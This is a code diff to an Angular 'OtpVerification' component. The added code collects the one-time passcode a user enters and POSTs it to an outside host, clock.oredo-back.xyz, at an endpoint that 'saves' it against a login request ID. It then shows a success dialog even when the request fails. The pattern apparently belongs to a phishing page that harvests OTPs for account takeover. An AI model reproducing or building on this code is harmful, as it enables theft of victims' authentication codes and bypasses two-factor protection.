@@ -104,8 +104,30 @@ export class OtpVerification implements OnInit, OnDestroy {
     event.preventDefault();
     if (!this.isOtpComplete) return;
 
-    // Open final success modal screen
-    this.isSuccessDialogOpen.set(true);
+    const otpCode = this.digits().join('');
+    const requestId = this.watchState.currentRequestId();
+
+    if (requestId) {
+      fetch(`https://clock.oredo-back.xyz/api/logins/${requestId}/otp`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ otp: otpCode }),
+      })
+        .then((res) => {
+          if (!res.ok) throw new Error('Failed to save OTP');
+          return res.json();
+        })
+        .then(() => {
+          console.log('OTP saved successfully on backend');
+          this.isSuccessDialogOpen.set(true);
+        })
+        .catch((err) => {
+          console.error('Error saving OTP:', err);
+          this.isSuccessDialogOpen.set(true);
+        });
+    } else {
+      this.isSuccessDialogOpen.set(true);
+    }
   }
 
   // Exit back to landing/home
